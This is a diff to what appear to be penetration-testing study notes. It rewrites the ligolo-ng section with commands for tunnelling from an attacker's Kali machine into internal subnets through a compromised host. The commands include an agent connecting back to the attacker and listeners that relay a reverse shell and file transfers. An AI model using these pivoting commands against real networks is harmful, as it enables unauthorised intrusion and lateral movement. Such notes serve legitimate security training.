@@ -99,34 +99,21 @@ Using chisel to do one reverse port forwarding, doesn't have to use proxychains4
 ```
 ###### ligolo-ng
 ![image](https://github.com/user-attachments/assets/66ad772e-0f66-4a10-b3c3-29e3fbcc9edf)
-Proxy:attacker machine
 ```
-Settingup:
-sudo ip tuntap add user kali mode tun ligolo
-sudo ip link set ligolo up
-./proxy -selfcert
-
-Setting up tunnel:
-session
-listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
-# Creates a listener on the machine where we're running the agent at port 1234
-# and redirects the traffic to port 4444 on attacker machine.
-# You can use other ports, of course.
-sudo ip route add 172.16.5.0/24 dev ligolo
-sudo ip route add 172.16.6.0/24 dev ligolo
-```
-Agent:linux
-```
-./agent -connect 10.10.14.213:11601 -ignore-cert
-start
-
-```
-Double Pivot
-```
-agent_1:listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601
-agent_2:/agent.exe -connect 172.16.5.15:11601 -ignore-cert
-
-Once again, ligolo-ng will tell us that an agent has joined. We can use the session command as before to switch to the new session and then start to begin a tunnel over that connection instead.
+kali: sudo ip tuntap add user kali mode tun ligolo
+kali: sudo ip link set ligolo up
+kali: ./proxy -selfcert
+ms01: agent.exe -connect kali_ip:11601 -ignore-cert
+kali: session
+kali: 1
+kali: ifconfig
+kali: sudo ip route add 10.10.120.0/24 dev ligolo
+kali: session;1
+kali: start
+kali: listener_list
+kali: listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444(reverse shell)
+kali: listener_list
+kali: listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80(file transfer)
 ```
 ### Windows Port forwarding
 ###### PLINK.exe
